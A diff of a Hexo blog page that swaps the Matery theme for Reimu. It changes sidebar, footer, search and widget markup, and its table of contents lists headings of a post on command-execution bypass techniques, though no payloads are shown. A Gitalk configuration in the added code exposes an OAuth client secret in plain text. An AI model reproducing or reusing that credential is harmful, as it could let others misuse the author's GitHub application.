+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
         </div>
+      
     </div>
-</div>
+  </div>
 
-<!-- TOC 悬浮按钮. -->
+  
+</aside>
 
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-
-    
-
-</main>
-
-
-
-
-                <footer class="page-footer bg-color">
-    
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
-
-    <div class="container row center-align"
-         style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            
-                <span id="year">2023-2024</span>
-            
-            <a href="/about" target="_blank">Yyjccc</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            
-            <br>
-            
-            
-            
-                
-            
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
-            
-            <br>
-
-            <!-- 运行天数提醒. -->
-            
-            <br>
-            
+          
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/yyjccc" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
-
-
-
-    <a href="mailto:yanyongjuyyj@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3393867490" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3393867490" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
-</div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2024
+      <span class="footer-info-sep"></span>
+      Yyjccc
     </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        142.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        09:44
+      </div>
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
 </footer>
 
-<div class="progress-bar"></div>
-
-
-                    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
         </div>
-        <div id="searchResult"></div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">命令执行漏洞（RCE）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash"><span class="toc-number">1.2.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF-%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">WAF****绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见的替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">1.3.2.</span> <span class="toc-text">通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-number">1.3.3.</span> <span class="toc-text">连接符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.4.</span> <span class="toc-text">正则表达式绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">黑名单绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D-%E6%95%B0%E5%AD%97-RCE"><span class="toc-number">1.4.</span> <span class="toc-text">无字母(数字)RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BC%82%E6%88%96"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.异或 ^</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%96%E5%8F%8D"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.取反 ~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%87%AA%E5%A2%9E"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.自增</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.临时文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">1.5.</span> <span class="toc-text">无参数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="toc-number">1.6.</span> <span class="toc-text">核心代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-getallheaders"><span class="toc-number">1.7.</span> <span class="toc-text">1.getallheaders()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-get-defined-vars"><span class="toc-number">1.8.</span> <span class="toc-text">2.get_defined_vars()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-session-id"><span class="toc-number">1.9.</span> <span class="toc-text">3.session_id()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-php%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.</span> <span class="toc-text">4.php函数直接读取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-localeconv"><span class="toc-number">1.10.1.</span> <span class="toc-text">1.localeconv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-scandir"><span class="toc-number">1.10.2.</span> <span class="toc-text">2.scandir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-current-pos"><span class="toc-number">1.10.3.</span> <span class="toc-text">3.current(pos)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-chdir"><span class="toc-number">1.10.4.</span> <span class="toc-text">4.chdir()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-array-reverse"><span class="toc-number">1.10.5.</span> <span class="toc-text">5.array_reverse()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-highlight-file"><span class="toc-number">1.10.6.</span> <span class="toc-text">6.highlight_file()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.11.</span> <span class="toc-text">无回显RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.11.0.1.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dnslog"><span class="toc-number">1.11.0.2.</span> <span class="toc-text">dnslog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.11.0.3.</span> <span class="toc-text">文件下载</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
+  <div class="sidebar-author-name">Yyjccc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">42</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
     </div>
+  
 </div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
 
-<script type="text/javascript">
-$(function () {
-    var searchFunc = function (path, search_id, content_id) {
-        'use strict';
-        $.ajax({
-            url: path,
-            dataType: "xml",
-            success: function (xmlResponse) {
-                // get the contents from search data
-                var datas = $("entry", xmlResponse).map(function () {
-                    return {
-                        title: $("title", this).text(),
-                        content: $("content", this).text(),
-                        url: $("url", this).text()
-                    };
-                }).get();
-                var $input = document.getElementById(search_id);
-                var $resultContent = document.getElementById(content_id);
-                $input.addEventListener('input', function () {
-                    var str = '<ul class=\"search-result-list\">';
-                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-                    $resultContent.innerHTML = "";
-                    if (this.value.trim().length <= 0) {
-                        return;
-                    }
-                    // perform local searching
-                    datas.forEach(function (data) {
-                        var isMatch = true;
-                        var data_title = data.title.trim().toLowerCase();
-                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
-                        var data_url = data.url;
-                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
-                        var index_title = -1;
-                        var index_content = -1;
-                        var first_occur = -1;
-                        // only match artiles with not empty titles and contents
-                        if (data_title !== '' && data_content !== '') {
-                            keywords.forEach(function (keyword, i) {
-                                index_title = data_title.indexOf(keyword);
-                                index_content = data_content.indexOf(keyword);
-                                if (index_title < 0 && index_content < 0) {
-                                    isMatch = false;
-                                } else {
-                                    if (index_content < 0) {
-                                        index_content = 0;
-                                    }
-                                    if (i === 0) {
-                                        first_occur = index_content;
-                                    }
-                                }
-                            });
-                        }
-                        // show search results
-                        if (isMatch) {
-                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
-                            var content = data.content.trim().replace(/<[^>]+>/g, "");
-                            if (first_occur >= 0) {
-                                // cut out 100 characters
-                                var start = first_occur - 20;
-                                var end = first_occur + 80;
-                                if (start < 0) {
-                                    start = 0;
-                                }
-                                if (start === 0) {
-                                    end = 100;
-                                }
-                                if (end > content.length) {
-                                    end = content.length;
-                                }
-                                var match_content = content.substr(start, end);
-                                // highlight all keywords
-                                keywords.forEach(function (keyword) {
-                                    var regS = new RegExp(keyword, "gi");
-                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
-                                });
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
 
-                                str += "<p class=\"search-result\">" + match_content + "...</p>"
-                            }
-                            str += "</li>";
-                        }
-                    });
-                    str += "</ul>";
-                    $resultContent.innerHTML = str;
-                });
-            }
-        });
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
     };
-
-    searchFunc('/search.xml', 'searchInput', 'searchResult');
-});
-</script>
-
-                        <!-- 白天和黑夜主题 -->
-<div class="stars-con">
-    <div id="stars"></div>
-    <div id="stars2"></div>
-    <div id="stars3"></div>  
-</div>
-
-<script>
-    function switchNightMode() {
-        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
-        setTimeout(function () {
-            $('body').hasClass('DarkMode') 
-            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
-            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
-            
-            setTimeout(function () {
-            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
-                $(this).remove()
-            })
-            }, 2e3)
-        })
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
     }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
 </script>
 
-                            <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/gitalk/dist/gitalk.min.js" data-pjax></script>
+
+  
+  <script data-pjax>
+    var gitalkId = location.pathname;
+    var gitalk = new Gitalk({
+      clientID: '0efb4a442bc09d1ba17e',
+      clientSecret: 'd26f520fef841de4f4388029a0d5c0f4730357cf',
+      repo: 'https://github.com/Yyjccc/yyjccc.github.io.git',
+      owner: 'Yyjccc',
+      admin: "Yyjccc",
+      id: gitalkId, // Ensure uniqueness and length less than 50
+      distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    if (document.getElementById('comments')) {
+      gitalk.render('comments')
+    }
+  </script>
+
+
+
+
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    quicklink.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
 </div>
 
 
-                                <script
-                                    src="/libs/materialize/materialize.min.js"></script>
-                                <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-                                <script src="/libs/aos/aos.js"></script>
-                                <script
-                                    src="/libs/scrollprogress/scrollProgress.min.js"></script>
-                                <script
-                                    src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-                                <script src="/js/matery.js"></script>
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.0-alpha.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
 
-                                
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
 
-                                        
-
-                                                
-
-                                                    <script type="text/javascript">
-                                                        // 只在桌面版网页启用特效
-                                                        var windowWidth = $(window).width();
-                                                        if (windowWidth > 768) {
-                                                            document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
-                                                        }
-                                                    </script>
-                                                    
-
-                                                        <!-- 雪花特效 -->
-                                                        
-                                                            <script type="text/javascript">
-                                                                // 只在桌面版网页启用特效
-                                                                var windowWidth = $(window).width();
-                                                                if (windowWidth > 768) {
-                                                                    document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
-                                                                }
-                                                            </script>
-                                                            
-
-                                                                <!-- 鼠标星星特效 -->
-                                                                
-                                                                    <script type="text/javascript">
-                                                                        // 只在桌面版网页启用特效
-                                                                        var windowWidth = $(window).width();
-                                                                        if (windowWidth > 768) {
-                                                                            document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
-                                                                        }
-                                                                    </script>
-                                                                    
-
-                                                                        
-                                                                            <script
-                                                                                src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
-                                                                            <script
-                                                                                src="/libs/others/TencentCaptcha.js"></script>
-                                                                            <button id="TencentCaptcha"
-                                                                                data-appid="xxxxxxxxxx"
-                                                                                data-cbfn="callback" type="button"
-                                                                                hidden></button>
-                                                                            
-
-                                                                                <!-- Baidu Analytics -->
-
-                                                                                    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
 </script>
 
-                                                                                        
-                                                                                            <script
-                                                                                                src="/libs/others/clicklove.js"
-                                                                                                async="async"></script>
-                                                                                            
-                                                                                                
-                                                                                                    <script async
-                                                                                                        src="/libs/others/busuanzi.pure.mini.js"></script>
-                                                                                                    
 
-                                                                                                        
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
 
-                                                                                                                
 
-                                                                                                                        <!--腾讯兔小巢-->
-                                                                                                                        
-                                                                                                                                
-                                                                                                                                    <script
-                                                                                                                                        type="text/javascript"
-                                                                                                                                        color="0,0,255"
-                                                                                                                                        pointColor="0,0,255"
-                                                                                                                                        opacity='0.7'
-                                                                                                                                        zIndex="-1"
-                                                                                                                                        count="99"
-                                                                                                                                        src="/libs/background/canvas-nest.js"></script>
-                                                                                                                                    
 
-                                                                                                                                        
 
-                                                                                                                                                    
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
 
-                                                                                                                                                            
-                                                                                                                                                                <script
-                                                                                                                                                                    src="/libs/instantpage/instantpage.js"
-                                                                                                                                                                    type="module"></script>
-                                                                                                                                                                
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+  </html>
 
-    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
-
-</html>
